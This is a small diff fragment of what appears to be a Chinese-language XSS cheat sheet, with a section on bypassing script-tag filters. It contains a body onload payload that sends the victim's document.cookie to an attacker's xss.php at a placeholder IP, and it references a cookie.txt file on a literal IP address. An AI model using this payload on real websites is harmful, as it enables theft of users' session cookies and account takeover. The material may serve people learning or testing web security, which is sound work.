@@ -34,7 +34,8 @@ http://106.53.207.220/cookie.txt
 ## 绕过
 
 * 过滤script标签
-* 
+
+
 ````
 <body onload="document.location.href='http://[ip]/xss.php?xss='+document.cookie"></body>
 
